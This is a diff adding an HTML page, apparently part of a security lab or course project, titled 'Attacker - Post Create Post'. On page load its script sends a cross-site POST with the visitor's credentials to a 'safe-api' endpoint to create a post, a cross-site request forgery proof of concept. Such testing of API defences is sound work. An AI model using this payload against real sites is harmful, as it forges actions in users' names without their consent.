@@ -1,0 +1,67 @@
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>Attacker - Post Create Post</title>
+    <script>
+        const website = "https://safe-api.ian-chains.be/";
+        const CSRF_COOKIE_NAME = "csrf_token";
+        const CSRF_HEADER_NAME = "X-CSRF-Token";
+
+        function set_status(message, type) {
+            const el = document.getElementById('status');
+            if (!el) {
+                return;
+            }
+
+            el.textContent = message;
+            el.style.color = type === 'error' ? '#b91c1c' : '#166534';
+        }
+
+        function get_csrf_token() {
+            const match = document.cookie.match(new RegExp('(?:^|; )' + CSRF_COOKIE_NAME + '=([^;]*)'));
+            return match ? decodeURIComponent(match[1]) : null;
+        }
+
+        async function create_post() {
+            const url = website + "posts";
+            set_status('Post aanmaken...', 'info');
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': "application/x-www-form-urlencoded"
+                    },
+                    credentials: 'include',
+                    body: new URLSearchParams({
+                        title: "CSRF Attack Post Safe API",
+                        content: "This is the content of the CSRF attack post of the safe API."
+                    })
+                });
+
+                const result = await response.json();
+                if (!response.ok) {
+                    console.error('Status:', response.status, 'Error:', result);
+                    set_status('Fout bij aanmaken van post (HTTP ' + response.status + ').', 'error');
+                    return;
+                }
+
+                console.log('Post created successfully:', result);
+                set_status('Post succesvol aangemaakt.', 'success');
+                return;
+            } catch (error) {
+                console.error(error);
+                set_status('Netwerkfout: ' + (error.message || String(error)), 'error');
+            }
+        }
+
+        window.onload = () => {
+            create_post();
+        };
+    </script>
+</head>
+<body>
+<h1 class="text-3xl font-bold mb-4">Post Create Post</h1>
+<p id="status">Wachten op laden...</p>
+<body>
+</html>
